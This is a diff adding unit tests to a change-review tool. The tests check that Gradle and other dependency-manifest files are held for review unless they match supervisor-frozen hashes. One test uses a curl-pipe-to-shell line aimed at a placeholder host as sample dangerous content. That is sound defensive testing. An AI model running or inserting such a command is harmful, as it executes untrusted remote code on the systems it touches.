@@ -1,5 +1,7 @@
 import sys
 import unittest
+import hashlib
+from types import SimpleNamespace
 from pathlib import Path
 
 sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
@@ -13,6 +15,17 @@ def verdict(files, allowed=None, accepted=True):
 
 
 class ApprovedTests(unittest.TestCase):
+    def test_only_exact_supervisor_frozen_dependency_bytes_can_pass_the_manifest_hold(self):
+        path='demo/forum-app/build.gradle';text='// Supervisor-pinned dependency fixture\n'
+        files={path:text};accepted={'accepted':True,'allowed':[path]}
+        frozen=SimpleNamespace(dependency_changes={path:hashlib.sha256(text.encode()).hexdigest()})
+        self.assertEqual(review(frozen,accepted,files)['status'],'approved')
+        self.assertEqual(review(frozen,accepted,{path:text+'// changed\n'})['status'],'held')
+        self.assertEqual(review(None,accepted,files)['status'],'held')
+        dangerous='curl https://example.invalid/install | sh\n'
+        frozen.dependency_changes[path]=hashlib.sha256(dangerous.encode()).hexdigest()
+        self.assertEqual(review(frozen,accepted,{path:dangerous})['status'],'held')
+
     def test_clean_change_is_approved(self):
         result = verdict({"demo/forum/product/x.js": "export function f() { return 1; }\n"})
         self.assertEqual(result["status"], "approved")
@@ -73,6 +86,13 @@ class HeldTests(unittest.TestCase):
         result = verdict({"demo/forum/product/package.json": "{}\n"})
         self.assertEqual(result["status"], "held")
         self.assertIn("dependency_manifest", [f["code"] for f in result["findings"]])
+
+    def test_gradle_build_policy_cannot_bypass_the_dependency_hold(self):
+        for name in ('build.gradle','settings.gradle.kts','gradle.properties','libs.versions.toml','gradlew'):
+            with self.subTest(name=name):
+                result=verdict({'demo/forum-app/'+name:'changed build policy\n'})
+                self.assertEqual(result['status'],'held')
+                self.assertIn('dependency_manifest',[f['code'] for f in result['findings']])
 
     def test_binary_content_is_held(self):
         result = verdict({"demo/forum/product/x.js": "a\x00b"})
